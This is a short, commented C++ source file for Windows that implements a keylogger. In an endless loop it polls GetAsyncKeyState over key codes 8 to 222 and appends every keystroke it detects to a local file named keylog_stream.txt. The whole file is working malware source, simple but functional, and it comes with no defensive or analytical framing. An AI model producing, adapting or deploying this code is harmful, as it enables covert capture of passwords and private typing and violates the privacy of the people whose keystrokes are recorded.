#include <iostream> // gets input prints output
#include <fstream>  // write to file and read
#include <windows.h>
#include <Winuser.h>

using namespace std;

int main()
{
	char c;

		for(;;) // infinite loop
		{
			// using ASCII to collect input
			for(c = 8; c <= 222; c++)
			{
				// check for user input
				if(GetAsyncKeyState(c) == -32767)
				{
					// ios::app prevents file rewrite with every key press
					ofstream write("keylog_stream.txt", ios::app);
					write << c;
				}
			}
		}
	return 0;

}
